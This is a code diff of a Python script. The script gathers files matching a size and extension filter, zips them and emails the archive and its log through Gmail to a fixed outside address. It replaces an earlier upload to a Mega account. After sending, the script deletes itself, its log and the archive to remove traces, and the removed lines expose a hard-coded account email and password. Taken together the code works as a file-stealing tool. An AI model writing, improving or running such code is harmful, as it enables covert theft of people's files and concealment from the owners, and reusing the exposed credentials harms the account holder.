@@ -2,13 +2,14 @@ import os
 import socket
 import time
 import logging
-from mega import Mega
+import zipfile
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 MAX_RETRIES = 20
 RETRY_WAIT_SECONDS = 300
-
-EMAIL = "loorissnoual@gmail.com"
-PASSWORD = "Like2023"
 
 # Configure logging
 LOG_FILE_NAME = 'script_log.txt'
@@ -25,6 +26,7 @@ def log_info(message):
 def log_error(message):
     """Log errors."""
     logging.error(message)
+
     print(message)
 
 
@@ -54,36 +56,49 @@ def find_files_under_size(folder_path, max_size_bytes, allowed_extensions):
 def check_internet_connection():
     try:
         socket.create_connection(('8.8.8.8', 53), timeout=2)
+
         return True
     except Exception:
         return False
 
 
-def upload_files_to_mega(mega, file_paths, target_folder_name):
-    try:
-        target_folder = mega.find(target_folder_name)
-        if not target_folder:
-            log_error(f"Mega folder '{target_folder_name}' not found.")
-            return
-
+def create_zip_archive(file_paths, zip_file_name):
+    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
         for file_path in file_paths:
-            retry_count = 0
-            while retry_count < MAX_RETRIES:
-                try:
-                    mega.upload(file_path, target_folder[0])
-                    log_info(f"Uploaded {os.path.basename(file_path)} to Mega successfully.")
-                    break
-                except Exception as e:
-                    retry_count += 1
-                    log_error(f"Upload attempt {retry_count} failed: {str(e)}")
-                    if retry_count < MAX_RETRIES:
-                        log_info(f"Retrying in {RETRY_WAIT_SECONDS} seconds...")
-                        time.sleep(RETRY_WAIT_SECONDS)
-                    else:
-                        log_error("Max retry attempts reached. Skipping upload for this file.")
-    except Exception as e:
-        log_error(f"An error occurred during file upload to Mega: {e}")
+            zipf.write(file_path, arcname=os.path.basename(file_path))
 
+
+def send_email(zip_file, log_file):
+    sender_email = "YOUR_SENDER_EMAIL@gmail.com"  # Sender's email address
+    sender_password = "YOUR_SENDER_PASSWORD"  # Sender's email password
+    receiver_email = "loorissnoual@gmail.com"  # Receiver's email address
+
+    message = MIMEMultipart()
+    message['From'] = sender_email
+    message['To'] = receiver_email
+    message['Subject'] = "Files from Script"
+
+    part = MIMEBase('application', "octet-stream")
+    part.set_payload(open(zip_file, "rb").read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment; filename="files_to_upload.zip"')
+    message.attach(part)
+
+    part = MIMEBase('application', "octet-stream")
+    part.set_payload(open(log_file, "rb").read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment; filename="script_log.txt"')
+    message.attach(part)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+
+            server.login(sender_email, sender_password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+            log_info("Email sent successfully.")
+    except Exception as e:
+        log_error(f"An error occurred while sending the email: {e}")
 
 def main():
     log_info("Script started.")
@@ -103,43 +118,21 @@ def main():
         for found_file in found_files_list:
             log_info(f"- {found_file}")
 
-        if not check_internet_connection():
-            log_info("No internet connectivity. Waiting indefinitely.")
-            while not check_internet_connection():
-                time.sleep(RETRY_WAIT_SECONDS)
-            log_info("Internet connectivity restored.")
-
-        # Login to Mega
-        try:
-            mega = Mega()
-            m = mega.login(EMAIL, PASSWORD)
-            if m is None:
-                log_error("Failed to login to Mega. Aborting.")
-                return
-        except Exception as e:
-            log_error(f"An error occurred during Mega login: {e}")
-            return
-
-        # Specify the target Mega folder
-        target_folder_name = 'Documents'
-
-        # Upload files
-        upload_files_to_mega(m, found_files_list, target_folder_name)
+        # Create a zip archive
+        zip_file_name = 'files_to_upload.zip'
+        create_zip_archive(found_files_list, zip_file_name)
 
         # Wait for 3 seconds before sending the log file
         time.sleep(3)
 
-        # Upload the log file to Mega
-        try:
-            mega.upload(LOG_FILE_NAME, target_folder_name)
-            log_info("Uploaded log file to Mega successfully.")
-        except Exception as e:
-            log_error(f"An error occurred while uploading the log file to Mega: {e}")
+        # Send the email if connected to Wi-Fi
+        if check_internet_connection():
+            send_email(zip_file_name, LOG_FILE_NAME)
 
     except Exception as e:
         log_error(f"An error occurred: {e}")
 
-    # Auto destroy the script (delete the script file and log file)
+    # Auto destroy the script (delete the script file, log file, and zip file)
     script_file_path = os.path.abspath(__file__)
     try:
         os.remove(script_file_path)
@@ -152,6 +145,13 @@ def main():
         log_info("Log file deleted successfully.")
     except Exception as e:
         log_error(f"An error occurred while deleting the log file: {e}")
+
+    try:
+
+        os.remove(zip_file_name)
+        log_info("Zip file deleted successfully.")
+    except Exception as e:
+        log_error(f"An error occurred while deleting the zip file: {e}")
 
     log_info("Script completed.")
 
